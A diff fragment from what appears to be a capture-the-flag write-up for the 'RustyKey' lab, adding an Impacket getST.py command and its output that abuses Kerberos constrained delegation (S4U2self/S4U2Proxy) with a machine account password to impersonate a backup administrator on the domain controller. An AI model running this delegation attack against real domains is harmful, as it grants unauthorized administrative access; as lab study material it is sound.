@@ -656,7 +656,15 @@ Now checking bloodhound i see its becuase this user is marked sensitive, this fa
 However there is a backupadmin which is in the administrators group, this user is not marked as sensitive
 
 ```python
+ ❯❯❯ faketime -f +8h getST.py -spn 'cifs/DC.rustykey.htb' -impersonate 'backupadmin' 'rustykey.htb/IT-Computer3$:Rusty88!' -k     
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
 
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating backupadmin
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache
 ```
 
 
